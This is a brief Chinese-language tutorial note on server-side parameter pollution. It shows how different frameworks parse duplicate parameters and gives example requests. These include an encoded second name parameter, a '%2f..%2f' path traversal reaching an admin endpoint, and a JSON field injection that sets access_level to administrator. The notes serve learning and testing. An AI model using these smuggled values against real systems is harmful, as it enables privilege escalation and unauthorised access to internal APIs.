当我们在url中请求搜索这个的时候
```
GET /userSearch?name=peter%26name=carlos&back=/home
```
为了拿到用户name用户的资料,服务器需要对他的内部api发送查询
```
GET /users/search?name=peter&name=carlos&publicProfile=true
```
PHP 只解析最后一个参数。这会导致用户搜索 carlos
ASP.NET 将参数合并。这可能导致用户搜索 peter,carlos ，从而引发 Invalid username 错误信息。
Node.js / Express 仅解析第一个参数。这会导致用户搜索 peter 时，结果保持不变。

# restful api


## 服务器端参数污染
RESTful API 可以将参数名称和值放置在 URL 路径中，而不是查询字符串中。例如，考虑以下路径：
```
/api/users/123
```
这个路径可能可以分为：
/api是根api端点
/users代表一个资源
/123代表一个参数(这里是一个特定用户的标识符)

ex.
当我们在客户端
```
GET /edit_profile.php?name=peter
```
需要服务器端进行内部请求
```
GET /api/private/users/peter
```
这个我们是抓不到包的，这是服务器与后端系统之间的通信
假如我们
```
GET /edit_profile.php?name=peter%2f..%2fadmin
```
会导致服务器端请求
```
GET /api/private/users/peter/../admin
```
如果服务器端客户端或后端 API 对此路径进行规范化，它可能解析为 /api/private/users/admin

ex.
测试结构化数据格式中的服务器端参数污染
请求
```
POST /myaccount
name=peter
```
导致
```
PATCH /users/7312/update
{"name":"peter"}
```
恶意请求
```
POST /myaccount
name=peter","access_level":"administrator
```
导致
```
PATCH /users/7312/update
{name="peter","access_level":"administrator"}
```